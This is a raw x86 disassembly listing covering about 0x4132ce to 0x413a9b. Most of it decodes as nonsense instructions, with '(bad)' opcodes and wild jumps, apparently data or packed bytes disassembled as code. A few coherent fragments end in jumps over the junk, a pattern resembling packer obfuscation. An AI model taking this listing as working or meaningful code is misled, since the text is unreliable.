  4132ce:	outs   dx,BYTE PTR ds:[esi]
  4132cf:	into   
  4132d0:	dec    ebx
  4132d1:	xchg   ecx,esi
  4132d3:	mov    al,0x5e
  4132d5:	dec    ebp
  4132d6:	not    DWORD PTR [eax+0x70d758ea]
  4132dc:	dec    si
  4132de:	iret   
  4132df:	adc    edx,DWORD PTR [edi-0x3f0cc050]
  4132e5:	jnp    0x41326e
  4132e7:	test   ah,dh
  4132e9:	jnp    0x4132e9
  4132eb:	mov    bl,0xc1
  4132ed:	or     al,0xbd
  4132ef:	jae    0x41333f
  4132f1:	mov    ah,0xbe
  4132f3:	fild   QWORD PTR [edi+0x14]
  4132f6:	jp     0x413305
  4132f8:	push   0x6e733081
  4132fd:	cli    
  4132fe:	sbb    DWORD PTR [esi-0x12d83eba],edx
  413304:	in     eax,0x73
  413306:	arpl   WORD PTR [edi+eax*8+0x68],sp
  41330a:	jne    0x413354
  41330c:	aas    
  41330d:	es mov ch,0x3e
  413310:	out    dx,al
  413311:	stos   DWORD PTR es:[edi],eax
  413312:	popa   
  413313:	inc    edx
  413314:	fst    QWORD PTR [ebp+ebp*8-0x6a]
  413318:	xor    dh,BYTE PTR [ebx-0x7c]
  41331b:	fidiv  WORD PTR [ebp+0x41c14db7]
  413321:	stc    
  413322:	mov    esp,es
  413324:	inc    edx
  413325:	fcmovbe st,st(3)
  413327:	push   0xac5d8934
  41332c:	leave  
  41332d:	cmc    
  41332e:	xchg   esi,eax
  41332f:	push   0xba92fd4
  413334:	xchg   edi,eax
  413335:	les    ebp,FWORD PTR [esi+0x12]
  413338:	or     al,0x41
  41333a:	outs   dx,BYTE PTR ds:[esi]
  41333b:	inc    edx
  41333c:	inc    esi
  41333d:	cli    
  41333e:	out    dx,al
  41333f:	sbb    eax,0xe8992c9a
  413344:	mov    al,fs:0x89d8b014
  41334a:	xchg   ebx,eax
  41334b:	out    0x82,al
  41334d:	addr16 sbb eax,0x4aa7e1f2
  413353:	pop    ds
  413354:	sbb    WORD PTR [edx-0x4aa702d3],cx
  41335b:	dec    esp
  41335c:	add    eax,0xae136aaa
  413361:	(bad)  ds:0xcf36e600
  413367:	inc    DWORD PTR [ecx+edx*2]
  41336a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41336b:	ficom  WORD PTR [ecx]
  41336d:	xor    eax,0xc827fe72
  413372:	jle    0x4133bd
  413374:	inc    esi
  413375:	sbb    edx,DWORD PTR [esi+0xd33a4b7]
  41337b:	lock ret 
  41337d:	push   ds
  41337e:	xor    eax,0x3b6c7162
  413383:	cmp    eax,DWORD PTR ds:[eax-0x391cc8ac]
  41338a:	mov    ah,0xdd
  41338c:	cmp    edx,DWORD PTR [ebp+0x19]
  41338f:	push   ebx
  413390:	mov    esi,0x434decd7
  413395:	cli    
  413396:	add    DWORD PTR [edi+0x43],esi
  413399:	dec    edx
  41339a:	pop    esp
  41339b:	jecxz  0x413405
  41339d:	in     eax,dx
  41339e:	cmp    al,0xda
  4133a0:	aad    0x79
  4133a2:	icebp  
  4133a3:	js     0x413343
  4133a5:	imul   esi,DWORD PTR ds:0x79b6fe37,0xffffff99
  4133ac:	mov    esp,0xf568cdc
  4133b1:	cmp    al,0xc1
  4133b3:	xchg   esp,eax
  4133b4:	mov    ecx,0x8f501f26
  4133b9:	aam    0xbc
  4133bb:	test   eax,0x261bb1de
  4133c0:	mov    eax,ds:0xa07989fc
  4133c5:	test   BYTE PTR [eax+0x771b4056],bl
  4133cb:	(bad)  
  4133cc:	test   DWORD PTR [edx],0xab64dda4
  4133d2:	pop    ecx
  4133d3:	std    
  4133d4:	inc    ecx
  4133d5:	or     edi,DWORD PTR [eax+0x5d1a17e8]
  4133db:	call   0x1e8d9bde
  4133e0:	and    ebx,DWORD PTR [ebp+ebp*8-0x17315e05]
  4133e7:	add    eax,0xaf311799
  4133ec:	popf   
  4133ed:	xchg   ecx,eax
  4133ee:	xchg   edi,eax
  4133ef:	push   edx
  4133f0:	repz data16 loope 0x413400
  4133f4:	inc    eax
  4133f5:	les    ecx,FWORD PTR [edi]
  4133f7:	jl     0x13c55a80
  4133fd:	aam    0x47
  4133ff:	mov    WORD PTR [ebp-0x63],es
  413402:	and    WORD PTR [edi+0x42],ax
  413406:	xor    BYTE PTR [edi+0x58],bl
  413409:	or     DWORD PTR [edi+eiz*1-0x1b],ecx
  41340d:	sbb    DWORD PTR [eax+ebx*4-0x24],eax
  413411:	dec    eax
  413412:	mov    al,0x46
  413414:	in     eax,0xa7
  413416:	or     edi,edx
  413418:	(bad)  
  413419:	xor    esp,edi
  41341b:	mov    ds:0xf2c527d1,al
  413420:	push   ds
  413421:	inc    esp
  413422:	fst    DWORD PTR [ebx+0x64d73be6]
  413428:	addr16 jp 0x4133c8
  41342b:	dec    esp
  41342c:	mov    ebp,?
  41342e:	pop    eax
  41342f:	aas    
  413430:	push   esp
  413431:	mov    ebp,0x2e837655
  413436:	push   ebp
  413437:	xor    DWORD PTR [esi+ecx*1+0x11],eax
  41343b:	mov    dl,0xa4
  41343d:	dec    eax
  41343e:	add    edi,DWORD PTR [ebp-0x14]
  413441:	mov    ebx,DWORD PTR [ebp-0x1c]
  413444:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  41344b:	jmp    0x4136d3
  413450:	enter  0xd1c5,0xc0
  413454:	(bad)  
  413456:	(bad)  
  413458:	cld    
  413459:	imul   ecx,esi,0x6dc6265e
  41345f:	in     eax,dx
  413460:	inc    ebx
  413461:	js     0x4134e2
  413463:	js     0x41344a
  413465:	jle    0x4134df
  413467:	js     0x4134ce
  413469:	add    BYTE PTR [esp+ebx*8],al
  41346c:	outs   dx,DWORD PTR ds:[esi]
  41346d:	xor    eax,0xca6d6f22
  413472:	cmc    
  413473:	mov    cs,WORD PTR [eax]
  413475:	mov    bl,0x7f
  413477:	cmc    
  413478:	jno    0x4134bb
  41347a:	pop    ecx
  41347b:	mov    al,ds:0x6d8f4bb3
  413480:	jp     0x4134e0
  413482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413483:	cmp    eax,DWORD PTR [edi+0x8]
  413486:	popa   
  413487:	es js  0x413481
  41348a:	addr16 mov ch,0x36
  41348d:	bound  edx,QWORD PTR ds:0xaefcc209
  413493:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413494:	in     eax,0x28
  413496:	push   ds
  413497:	mov    esp,0x10423972
  41349c:	repz dec edi
  41349e:	sbb    ebp,edx
  4134a0:	lock dec edi
  4134a2:	cmp    DWORD PTR [ebp+0x45],ebp
  4134a5:	mov    bh,BYTE PTR [edi-0x7b]
  4134a8:	sbb    esi,edx
  4134aa:	in     al,dx
  4134ab:	jmp    0x1ae38590
  4134b0:	cwde   
  4134b1:	out    dx,eax
  4134b2:	inc    esi
  4134b3:	adc    bh,BYTE PTR [edx+0x20a0755e]
  4134b9:	mov    ch,0x64
  4134bb:	(bad)  [bx+di+0x29c3]
  4134c0:	int    0xf2
  4134c2:	fdiv   QWORD PTR [ecx]
  4134c4:	sub    bl,ah
  4134c6:	cmc    
  4134c7:	fild   WORD PTR [edx+0x2c]
  4134ca:	jg     0x413549
  4134cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134cd:	and    eax,0x38b0158d
  4134d2:	fcmove st,st(3)
  4134d4:	sbb    eax,0x6a
  4134d7:	shl    bl,cl
  4134d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134da:	out    dx,al
  4134db:	out    dx,al
  4134dc:	lea    ecx,[ebx+0x2b254cfa]
  4134e2:	jb     0x413524
  4134e4:	loope  0x4134cf
  4134e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134e7:	std    
  4134e8:	push   ebp
  4134e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134ea:	sub    BYTE PTR [edi-0x43340cdb],dh
  4134f0:	pushf  
  4134f1:	pushf  
  4134f2:	jbe    0x41350a
  4134f4:	pop    esp
  4134f5:	inc    eax
  4134f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134f7:	sbb    ch,bl
  4134f9:	xchg   ebx,eax
  4134fa:	cmp    DWORD PTR [ebx+0x2d],esi
  4134fd:	jb     0x413575
  4134ff:	adc    edx,DWORD PTR [ebx-0x6a]
  413502:	cmp    al,BYTE PTR es:[edi]
  413505:	lods   al,BYTE PTR ds:[esi]
  413506:	pop    eax
  413507:	les    edi,FWORD PTR [ecx-0x4e0825cc]
  41350d:	cmp    eax,0xff2e5417
  413512:	xchg   ebx,eax
  413513:	inc    esp
  413514:	push   eax
  413515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413516:	push   es
  413517:	xchg   BYTE PTR [ebx+0x777b8993],ch
  41351d:	shl    DWORD PTR [ebp+0x43],cl
  413520:	push   es
  413521:	ins    BYTE PTR es:[edi],dx
  413522:	mov    cl,al
  413524:	and    ebp,edi
  413526:	jbe    0x413539
  413528:	(bad)  
  413529:	fisttp WORD PTR [edx]
  41352b:	dec    esp
  41352c:	cmp    BYTE PTR [esi+0x56e3a41b],dl
  413532:	ret    
  413533:	cld    
  413534:	cli    
  413535:	adc    dh,BYTE PTR [esi+0x665fa0b]
  41353b:	mov    dl,0xbd
  41353d:	pop    esi
  41353e:	and    al,0x86
  413540:	popa   
  413541:	xor    BYTE PTR [ebx-0x64c6409f],dl
  413547:	lea    edx,[bx-0x7451]
  41354c:	fld    st(2)
  41354e:	repnz push ebp
  413550:	retf   
  413551:	cmp    cl,BYTE PTR ds:0xb41ba72c
  413557:	nop
  413558:	xor    BYTE PTR [eax-0x77],0x71
  41355c:	jg     0x413540
  41355e:	or     DWORD PTR [edi+eax*1+0x145f4f60],edi
  413565:	mov    bl,0xff
  413567:	push   ds
  413568:	popa   
  413569:	add    esp,DWORD PTR [esp+esi*8-0x4c81dcc5]
  413570:	rcl    BYTE PTR [eax],cl
  413572:	cld    
  413573:	imul   ecx,DWORD PTR [ebx+0x2ad4da18],0x9b5d9e75
  41357d:	mov    al,0x93
  41357f:	dec    ebx
  413580:	hlt    
  413581:	ror    bh,cl
  413583:	mov    eax,0x7d066453
  413588:	mov    edx,0xfe16e1aa
  41358d:	ret    0x884e
  413590:	shl    BYTE PTR [ebx],1
  413592:	inc    esp
  413593:	add    al,0xb7
  413595:	retf   0xb3d2
  413598:	cmp    DWORD PTR [edx-0x1d083bb8],esi
  41359e:	ss dec ebx
  4135a0:	lahf   
  4135a1:	xor    cl,BYTE PTR fs:[eax+0x7d]
  4135a5:	(bad)  
  4135a6:	adc    DWORD PTR ds:0x8ee858db,ebp
  4135ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135ad:	bound  esi,QWORD PTR [eax]
  4135af:	fldln2 
  4135b1:	cmp    bl,BYTE PTR [edi+0x13]
  4135b4:	push   cs
  4135b5:	sbb    DWORD PTR [ebx],esp
  4135b7:	ja     0x41361c
  4135b9:	inc    esi
  4135ba:	retf   
  4135bb:	inc    ebp
  4135bc:	inc    edx
  4135bd:	mov    fs,WORD PTR [ecx+edx*2+0x184f49dc]
  4135c4:	mov    ch,0x5d
  4135c6:	adc    ah,BYTE PTR [ebp+0x1c]
  4135c9:	inc    esi
  4135ca:	jno    0x4135a8
  4135cc:	(bad)  
  4135cd:	and    eax,0x6aeb4d3e
  4135d2:	sub    DWORD PTR [edx],esi
  4135d4:	pop    esi
  4135d5:	sbb    BYTE PTR [ebx-0x26bbfe76],ch
  4135db:	jo     0x41358c
  4135dd:	push   edx
  4135de:	lock jno 0x413640
  4135e1:	xor    DWORD PTR [ebp+0x2],eax
  4135e4:	cmp    bh,BYTE PTR [edi*2+0x67d5f2de]
  4135eb:	mov    ds,WORD PTR [eax-0x58]
  4135ee:	test   eax,0x13d6e0e1
  4135f3:	ja     0x413652
  4135f5:	jo     0x4135f6
  4135f7:	retf   
  4135f8:	xor    ecx,ecx
  4135fa:	push   esp
  4135fb:	leave  
  4135fc:	ret    0x36e6
  4135ff:	mov    esi,0x7a21a507
  413604:	jg     0x4135a0
  413606:	or     dh,bl
  413608:	adc    al,0x1f
  41360a:	or     ch,bl
  41360c:	lock ins DWORD PTR es:[edi],dx
  41360e:	push   ebx
  41360f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413610:	push   0x420ee4e7
  413615:	add    eax,0xa82e6315
  41361a:	adc    al,0xc5
  41361c:	pushf  
  41361d:	and    esi,DWORD PTR [ebp+0x3871edf4]
  413623:	cs adc eax,0xbcd4dda1
  413629:	sub    ebx,DWORD PTR [ebp-0x1f]
  41362c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41362d:	aad    0xcb
  41362f:	jb     0x413687
  413631:	cwde   
  413632:	jecxz  0x413669
  413634:	call   0x66636939
  413639:	in     al,0xb1
  41363b:	mov    bh,0xe
  41363d:	pusha  
  41363e:	psubw  mm7,QWORD PTR [edx-0x79d23965]
  413645:	mov    edi,0xf39bbd76
  41364a:	fnstsw WORD PTR ds:0xd3ea84b
  413650:	push   ebp
  413651:	mov    dl,0xd0
  413653:	xor    eax,0x4f268887
  413658:	and    BYTE PTR [eax],dl
  41365a:	mov    al,0x89
  41365c:	mov    ds:0x909646cd,al
  413661:	rcl    dl,cl
  413663:	and    BYTE PTR [edi],0xa0
  413666:	in     al,dx
  413667:	rcr    BYTE PTR ds:0xf8955710,0x21
  41366e:	push   ds
  41366f:	shl    BYTE PTR [ebx],0x15
  413672:	pop    esp
  413673:	repnz xchg ebp,eax
  413675:	dec    edx
  413676:	push   edi
  413677:	xchg   DWORD PTR [edx-0xd],ebx
  41367a:	aad    0xc4
  41367c:	mov    DWORD PTR [ebx+eiz*1],edi
  41367f:	aas    
  413680:	ror    bl,cl
  413682:	dec    eax
  413683:	add    eax,0x1c57b2e3
  413688:	fistp  DWORD PTR ds:[edx]
  41368b:	adc    eax,0x6b58cbb8
  413690:	call   0x5f3b3d87
  413695:	in     eax,0x4e
  413697:	shl    BYTE PTR ds:0xd923dab3,cl
  41369d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41369e:	ret    0x83f1
  4136a1:	mov    eax,ds:0xcfec03f8
  4136a6:	mov    eax,ds:0xb5040971
  4136ab:	cmp    eax,0xc2a55fe7
  4136b0:	scas   eax,DWORD PTR es:[edi]
  4136b1:	ror    BYTE PTR [edi+0x47],cl
  4136b4:	jp     0x413663
  4136b6:	shr    BYTE PTR [edx+0xe],cl
  4136b9:	sub    al,0x3a
  4136bb:	inc    esi
  4136bc:	scas   eax,DWORD PTR es:[edi]
  4136bd:	mov    ch,BYTE PTR [ecx+0x8]
  4136c0:	jo     0x41364a
  4136c2:	loopne 0x413680
  4136c4:	ja     0x4136d1
  4136c6:	in     eax,0x43
  4136c8:	jbe    0x4136f0
  4136ca:	pop    esp
  4136cb:	nop
  4136cc:	fimul  WORD PTR [esi]
  4136ce:	rol    BYTE PTR [edi-0x56],0xa4
  4136d2:	jo     0x41365f
  4136d4:	push   ebp
  4136d5:	mov    esp,0x33f47d8b
  4136da:	shl    BYTE PTR [ebx],1
  4136dc:	clc    
  4136dd:	add    edx,ecx
  4136df:	add    edi,ecx
  4136e1:	jmp    0x413969
  4136e6:	ror    ecx,0xc2
  4136e9:	ror    dl,0xc7
  4136ec:	leave  
  4136ed:	leave  
  4136ee:	mov    ?,WORD PTR [ebp-0x35508de7]
  4136f4:	jle    0x4136a5
  4136f6:	sub    BYTE PTR [ebp+0x7f],bh
  4136f9:	js     0x4136e0
  4136fb:	jle    0x413775
  4136fd:	js     0x41376e
  4136ff:	sbb    ch,dl
  413701:	scas   al,BYTE PTR es:[edi]
  413702:	jmp    0x4136d6
  413704:	iret   
  413705:	test   ecx,eax
  413707:	and    DWORD PTR [ecx-0x601cd30f],esi
  41370d:	mov    al,ds:0x77156119
  413712:	gs retf 0x3905
  413716:	ja     0x4136e0
  413718:	clc    
  413719:	idiv   BYTE PTR [ebx+0x1384a2cc]
  41371f:	rcr    BYTE PTR [edx+0x43a3acb6],0x6b
  413726:	pushf  
  413727:	mov    BYTE PTR [eax],dh
  413729:	mov    bl,0xb2
  41372b:	out    dx,eax
  41372c:	shl    BYTE PTR [ecx],0x76
  41372f:	(bad)  
  413730:	mov    ds:0x544da573,eax
  413735:	sbb    eax,0xc184e02d
  41373a:	cli    
  41373b:	push   ebx
  41373c:	fmul   QWORD PTR [ebp+0x51]
  41373f:	xchg   ecx,eax
  413740:	and    eax,0x1bec2697
  413745:	aam    0xd2
  413747:	mov    DWORD PTR [edx+0x4ada06bf],esi
  41374d:	in     eax,0x74
  41374f:	mov    WORD PTR [ebx-0x13],gs
  413752:	jl     0x413728
  413754:	imul   edx,DWORD PTR [edi+0x7e],0x1a
  413758:	mov    ebp,edx
  41375a:	std    
  41375b:	pop    ecx
  41375c:	xchg   esp,eax
  41375d:	inc    edi
  41375e:	cld    
  41375f:	mov    eax,esi
  413761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413762:	(bad)  
  413764:	(bad)  
  413765:	cmp    eax,0xb8a40715
  41376a:	sub    BYTE PTR [edi-0xd],bl
  41376d:	jno    0x413781
  41376f:	jl     0x4137d0
  413771:	jae    0x413795
  413773:	jle    0x41376f
  413775:	push   cs
  413776:	xor    bl,al
  413778:	cwde   
  413779:	dec    ecx
  41377a:	imul   edx,DWORD PTR [ebp+0xdeff830],0xb0449b9b
  413784:	(bad)  
  413785:	iret   
  413786:	addr16 mov edx,0x3d44e15f
  41378c:	cli    
  41378d:	or     ebx,DWORD PTR [ebx-0x73fcc95f]
  413793:	cmp    ebp,DWORD PTR [edi]
  413795:	or     DWORD PTR [ebx+0x3e1667],esi
  41379b:	mov    esi,0xbb0e4d9b
  4137a0:	xchg   ebp,eax
  4137a1:	mov    ebx,0xc6c3284e
  4137a6:	mov    WORD PTR [ebx+eiz*8+0x5e],?
  4137aa:	or     edx,eax
  4137ac:	jnp    0x413774
  4137ae:	sub    BYTE PTR [esi],cl
  4137b0:	in     al,dx
  4137b1:	or     cl,BYTE PTR [ecx-0x356d17b4]
  4137b7:	or     eax,0x2c138d89
  4137bc:	retf   0xf61b
  4137bf:	dec    edx
  4137c0:	cli    
  4137c1:	jmp    0x413814
  4137c3:	inc    eax
  4137c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137c5:	cmc    
  4137c6:	in     al,dx
  4137c7:	adc    al,BYTE PTR [ebx]
  4137c9:	dec    eax
  4137ca:	push   0xffffffe5
  4137cc:	xchg   edi,eax
  4137cd:	scas   eax,DWORD PTR es:[edi]
  4137ce:	int    0x84
  4137d0:	mov    bh,0x65
  4137d2:	pop    ebp
  4137d3:	scas   al,BYTE PTR es:[edi]
  4137d4:	loope  0x41377f
  4137d6:	jae    0x4137b7
  4137d8:	xchg   edx,eax
  4137d9:	xor    edi,0xf2c82744
  4137df:	aaa    
  4137e0:	sbb    DWORD PTR [ebx],edi
  4137e2:	pop    ebx
  4137e3:	pop    eax
  4137e4:	hlt    
  4137e5:	jb     0x41378c
  4137e7:	(bad)  
  4137e8:	cmp    al,0x4f
  4137ea:	push   ebx
  4137eb:	js     0x4137a4
  4137ed:	pop    ss
  4137ee:	popa   
  4137ef:	and    ecx,DWORD PTR [esi]
  4137f1:	outs   dx,DWORD PTR ds:[esi]
  4137f2:	push   ss
  4137f3:	pop    eax
  4137f4:	imul   ebp,DWORD PTR [eax],0x74
  4137f7:	mov    ds:0xd70fb573,al
  4137fd:	stc    
  4137fe:	ds jecxz 0x413816
  413801:	cmp    bl,bl
  413803:	pop    edx
  413804:	mov    al,0x1a
  413806:	inc    esp
  413807:	repnz mov esp,0xe104bd97
  41380d:	dec    esi
  41380e:	or     esi,esp
  413810:	push   esp
  413811:	das    
  413812:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413813:	pushf  
  413814:	dec    ebp
  413815:	pop    ds
  413816:	loope  0x4137ca
  413818:	and    DWORD PTR [eax+0x2384f2a7],ebx
  41381e:	adc    ch,BYTE PTR [edi-0x617ee02a]
  413824:	fisttp QWORD PTR [edi+0x37]
  413827:	stos   BYTE PTR es:[edi],al
  413828:	cmp    BYTE PTR [edi+0x62],al
  41382b:	adc    cl,BYTE PTR [edi-0x77902400]
  413831:	jbe    0x413883
  413833:	mov    BYTE PTR [ecx+0x4e],ah
  413836:	nop
  413837:	xchg   edi,eax
  413838:	or     cl,BYTE PTR [edx]
  41383a:	pavgw  mm3,mm4
  41383d:	push   cs
  41383e:	inc    eax
  41383f:	jl     0x413828
  413841:	mov    eax,0x6b3d9445
  413846:	fsubr  DWORD PTR [edi-0x1b]
  413849:	data16 mov dh,0x23
  41384c:	and    edi,DWORD PTR [ebx+0x47798a99]
  413852:	fidivr DWORD PTR [ebx-0x56]
  413855:	fdiv   QWORD PTR [ebp-0x64]
  413858:	jnp    0x4137dd
  41385a:	add    esi,DWORD PTR [esi-0x7e]
  41385d:	shr    DWORD PTR [ebp-0x74],cl
  413860:	inc    edi
  413861:	mov    ah,BYTE PTR [edx]
  413863:	fwait
  413864:	mov    esi,0xf497e0d4
  413869:	push   ebp
  41386a:	pop    esp
  41386b:	test   al,0x3d
  41386d:	mov    ds:0x4b7499be,eax
  413872:	and    ch,bl
  413874:	sbb    ah,BYTE PTR [edi+0x79]
  413877:	outs   dx,DWORD PTR ds:[esi]
  413878:	mov    bh,0xb2
  41387a:	and    al,bl
  41387c:	push   ebx
  41387d:	data16 adc bh,BYTE PTR [ebp-0xb]
  413881:	or     BYTE PTR [edi+0x770e7c92],ch
  413887:	mov    ebp,0x3b0a9a60
  41388c:	dec    esi
  41388d:	inc    esi
  41388e:	sub    BYTE PTR [ebp+0x43],0x2d
  413892:	xor    bh,BYTE PTR [edx+ecx*2+0x67]
  413896:	push   cs
  413897:	mov    ds:0x53205982,al
  41389c:	mov    DWORD PTR [edi],edi
  41389e:	mov    esp,0x8e2eba4e
  4138a3:	push   eax
  4138a4:	jl     0x4138b8
  4138a6:	cmp    al,0x1b
  4138a8:	fcmovne st,st(0)
  4138aa:	xchg   esi,eax
  4138ab:	mov    cl,0xb5
  4138ad:	push   cs
  4138ae:	inc    edi
  4138af:	sub    eax,0xffaab248
  4138b4:	nop
  4138b5:	and    bl,bh
  4138b7:	mov    bl,BYTE PTR [edi+0x2aaa3cb]
  4138bd:	pop    edi
  4138be:	mov    dl,0xaf
  4138c0:	cmp    DWORD PTR [ebx],0x59
  4138c3:	cwde   
  4138c4:	adc    BYTE PTR [esi+ecx*4-0x41],al
  4138c8:	cmp    DWORD PTR [ebx-0x3841352a],esp
  4138ce:	in     al,0x91
  4138d0:	adc    eax,0xd120113f
  4138d5:	stos   BYTE PTR es:[edi],al
  4138d6:	add    esi,edx
  4138d8:	mov    fs,WORD PTR [ecx+eiz*1+0x50a08c4]
  4138df:	sar    DWORD PTR [ecx],0x8f
  4138e2:	dec    edx
  4138e3:	out    dx,eax
  4138e4:	xchg   edi,eax
  4138e5:	mov    dl,BYTE PTR [ecx]
  4138e7:	cmc    
  4138e8:	push   edx
  4138e9:	ds scas eax,DWORD PTR es:[edi]
  4138eb:	pop    esi
  4138ec:	fadd   QWORD PTR [edx]
  4138ee:	inc    edi
  4138ef:	ja     0x41390c
  4138f1:	enter  0x21c2,0x42
  4138f5:	loopne 0x4138bf
  4138f7:	adc    ch,BYTE PTR [edx+ebp*4+0x6b]
  4138fb:	aad    0xbc
  4138fd:	icebp  
  4138fe:	cwde   
  4138ff:	and    BYTE PTR ds:[ebx],0x23
  413903:	jl     0x413928
  413905:	in     eax,0x97
  413907:	ret    0x134
  41390a:	sbb    al,0x12
  41390c:	cmp    eax,0x3d9244cd
  413911:	dec    ebx
  413912:	xchg   ebp,eax
  413913:	outs   dx,BYTE PTR ds:[esi]
  413914:	mov    cs,WORD PTR [eax]
  413916:	out    0x0,eax
  413918:	xchg   ebp,eax
  413919:	enter  0xccd2,0x7e
  41391d:	(bad)  
  41391e:	js     0x413959
  413920:	cmp    esp,DWORD PTR [esp+eiz*8]
  413923:	sub    al,0x7d
  413925:	cmp    DWORD PTR [ecx],edi
  413927:	ret    0xa82f
  41392a:	aaa    
  41392b:	lods   eax,DWORD PTR ds:[esi]
  41392c:	jl     0x4138ff
  41392e:	or     BYTE PTR [esi-0x138be31a],0x48
  413935:	mov    cl,0xde
  413937:	or     BYTE PTR [ebx+0x257c8f90],ch
  41393d:	outs   dx,BYTE PTR ds:[esi]
  41393e:	aas    
  41393f:	jge    0x4138ef
  413941:	pop    esi
  413942:	daa    
  413943:	dec    esi
  413944:	retf   0x6f91
  413947:	sbb    BYTE PTR [edx+0x6e],0x43
  41394b:	sub    eax,0x2ce3d3aa
  413950:	xchg   ecx,eax
  413951:	cs sub eax,0x8d858c04
  413957:	and    al,0x1d
  413959:	inc    ebx
  41395a:	inc    edi
  41395b:	and    al,0xba
  41395d:	jae    0x41394d
  41395f:	adc    BYTE PTR [ecx-0x1a801bf6],ch
  413965:	inc    ebx
  413966:	(bad)  
  413967:	jo     0x4139af
  413969:	imul   edx,edi
  41396c:	add    edx,DWORD PTR [ebp-0x14]
  41396f:	mov    DWORD PTR [ebp-0x14],edx
  413972:	mov    edx,DWORD PTR [ebp-0xc]
  413975:	mov    edi,DWORD PTR [ebp-0x24]
  413978:	xor    edx,eax
  41397a:	add    edx,ecx
  41397c:	imul   edx,edi
  41397f:	mov    edi,DWORD PTR [ebp-0xc]
  413982:	xor    edi,eax
  413984:	jmp    0x413c0c
  413989:	enter  0xc4cf,0xca
  41398d:	retf   
  41398e:	fxch   st(6)
  413990:	fld    DWORD PTR [edx]
  413992:	xchg   edx,eax
  413993:	(bad)  
  413994:	loope  0x41396b
  413996:	pushf  
  413997:	mov    al,0x42
  413999:	xchg   ebp,eax
  41399a:	add    edi,DWORD PTR [edi+0x78]
  41399d:	in     eax,0x7e
  41399f:	js     0x413a19
  4139a1:	mov    ah,0xa4
  4139a3:	das    
  4139a4:	add    BYTE PTR [esi+0x57],bl
  4139a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139a8:	call   0xc7d:0x210b4a48
  4139af:	pop    edx
  4139b0:	inc    edx
  4139b1:	sub    BYTE PTR [esi-0x48],dh
  4139b4:	and    bh,BYTE PTR [edx]
  4139b6:	mov    bh,0x3c
  4139b8:	rcr    BYTE PTR [eax],0xce
  4139bb:	popa   
  4139bc:	mov    edi,0x8b1a2c7f
  4139c1:	push   edx
  4139c2:	cmp    edi,DWORD PTR [ebp+0x6ccd550a]
  4139c8:	dec    ebx
  4139c9:	cmp    eax,0xa080b68a
  4139ce:	mov    edx,0xd922e123
  4139d3:	push   edi
  4139d4:	or     DWORD PTR [ebp+0x37fd5cb2],eax
  4139da:	lock mov ebx,0xb76ed065
  4139e0:	neg    dh
  4139e2:	aaa    
  4139e3:	or     ebp,edi
  4139e5:	sbb    bh,BYTE PTR [eax+0x17]
  4139e8:	cmp    dl,BYTE PTR [ecx+0x3e7eb5b3]
  4139ee:	jb     0x4139be
  4139f0:	jge    0x4139cf
  4139f2:	jp     0x4139fe
  4139f4:	aad    0xfe
  4139f6:	xor    BYTE PTR [edx+0x118bebc6],bl
  4139fc:	out    dx,eax
  4139fd:	push   ds
  4139fe:	loope  0x413a06
  413a00:	push   0xdf847451
  413a05:	jmp    0x9b30:0xf53de186
  413a0c:	mov    ds:0xcb27b5e,al
  413a11:	data16 sbb al,0xfa
  413a14:	push   es
  413a15:	jl     0x413a08
  413a17:	pop    edx
  413a18:	ins    DWORD PTR es:[edi],dx
  413a19:	push   esp
  413a1a:	into   
  413a1b:	adc    ch,dh
  413a1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a1e:	sti    
  413a1f:	dec    eax
  413a20:	retf   
  413a21:	dec    ebx
  413a22:	jnp    0x413a2c
  413a24:	call   0x2e96d835
  413a29:	adc    eax,0x8ed58ec7
  413a2e:	jl     0x413a83
  413a30:	push   ecx
  413a31:	pop    ss
  413a32:	adc    bl,dh
  413a34:	into   
  413a35:	xlat   BYTE PTR ds:[ebx]
  413a36:	aaa    
  413a37:	jle    0x413a71
  413a39:	arpl   WORD PTR [edi+0x7c],di
  413a3c:	xor    bl,ah
  413a3e:	shr    DWORD PTR [ebx+0x242cae4],0x8f
  413a45:	xor    dh,ch
  413a47:	enter  0xf185,0xf2
  413a4b:	xchg   esp,eax
  413a4c:	mov    esi,0xc7a607d2
  413a51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a52:	jmp    0x6ae0bcd6
  413a57:	xchg   dl,ch
  413a59:	fst    QWORD PTR [edx+0x4cc2a814]
  413a5f:	test   BYTE PTR [edx+0x4],al
  413a62:	pop    ds
  413a63:	add    al,0x7f
  413a65:	leave  
  413a66:	jcxz   0x413a15
  413a69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a6a:	adc    edx,edi
  413a6c:	xchg   edx,eax
  413a6d:	(bad)  
  413a6e:	cmp    eax,eax
  413a70:	pop    ecx
  413a71:	sub    eax,0x985c1901
  413a76:	pop    esp
  413a77:	sbb    al,0x2a
  413a79:	xor    al,0xc
  413a7b:	pop    esi
  413a7c:	mov    cl,0x7d
  413a7e:	jbe    0x413abb
  413a80:	push   ss
  413a81:	mov    esi,DWORD PTR [edi]
  413a83:	aas    
  413a84:	push   ebx
  413a85:	push   0xd0fb7bdc
  413a8a:	xchg   ebx,eax
  413a8b:	mov    al,0x34
  413a8d:	mov    ch,0xfb
  413a8f:	imul   ecx,DWORD PTR [eax-0x59],0xb7214ce0
  413a96:	mov    al,ds:0xf7615058
  413a9b:	adc    ebp,DWORD PTR ds:0x897aae2b
